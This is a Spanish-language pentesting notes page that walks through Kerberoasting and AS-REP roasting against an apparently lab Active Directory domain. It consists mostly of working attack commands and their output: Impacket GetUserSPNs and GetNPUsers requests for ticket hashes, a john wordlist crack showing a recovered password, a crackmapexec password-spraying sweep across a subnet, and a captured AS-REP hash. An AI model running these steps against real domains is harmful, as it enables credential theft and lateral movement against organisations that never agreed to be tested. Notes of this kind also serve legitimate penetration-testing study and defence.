# Kerberoasting Attack

## With Credentials

### Kerberos Ticket Granting Service (TGS) Extraction

1º Añadir al `/etc/hosts`el dominio:

<figure><img src="../../.gitbook/assets/Pasted image 20250302171819.png" alt=""><figcaption></figcaption></figure>

2º Lanzo un GetUserSPNs a ver si encuentro usuarios Kerbero asteables\`\`\`GetUserSPNs.py deimcorp.local/cbollin:Password1\`\`\`> Da igual el usuario, si es admin o no, solo con que este dentro del DC, sirve

<figure><img src="../../.gitbook/assets/Pasted image 20250302172731.png" alt=""><figcaption></figcaption></figure>

Ahora podemos hacer un request para que nos de el hash TGS de ese user

```
GetUserSPNs.py deimcorp.local/cbollin:Password1 -request
```

> `-request` Requests TGS for users and output them in JtR/hashcat format (default False)

<figure><img src="../../.gitbook/assets/Pasted image 20250302173216.png" alt=""><figcaption></figcaption></figure>

#### Crakeo de Hash TGS

Tan simple como lanzar un john a ese hash:

```
john -w:/usr/share/wordlists/rockyou.txt hash.txt
	1g 0:00:00:17 DONE (2025-03-02 17:45) 0.05595g/s 606950p/s 606950c/s 
	MYpassword123#   (?)     
	606950C/s MaRiAnItA..MYROOM2518
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed. 
```

#### Password Spraying

```
crackmapexec smb 100.100.100.0/24 -u 'svc_sqlservice' -p 'MYpassword123#'
```

> Si el usuario es Administrado debería poner (Pwn3d!) en todo

## Without Credentials

### Kerberos AS-REP Roasting

```
GetNPUsers.py deimcorp.local/ -no-pass -usersfile users
	[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
	[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
	[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
	[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
	[-] User Cbollin doesn't have UF_DONT_REQUIRE_PREAUTH set
	[-] User Champi doesn't have UF_DONT_REQUIRE_PREAUTH set
	[-] User admin2test doesn't have UF_DONT_REQUIRE_PREAUTH set
	$krb5asrep$23$svc_sqlservice@DEIMCORP.LOCAL:77b3dcb9131c3ffe119602698e39c265$75262eecac3f246309ec5abc20ee6a2ef66aa4d9ecfb4d6d1a5f2d8359c2089769f7baef85abc42dedbb930e1466fb99f89a8fbfab3be907dcade1905c265ae007a182dd73c008027dae1efd79069c27f8df449c074ca6fc7b0f19b1757e8f59a5ab47bed7d367499c40042b5897d7ca6178c3d44b7e648b0f5fada0c25c9852dc2b9c23164f183518010bdff872a3ab6a8687e2ae59d38d208aaf0db4b545664e711b8e640580544d53e8136abfc8361244ea456778f072bb059a04319cc21fc5dc14911e9f3860ad547419afac82a5456f465eedbc8931f02eb1cfdb6cc0e09da68bee84dff912f49be27631e63c
```
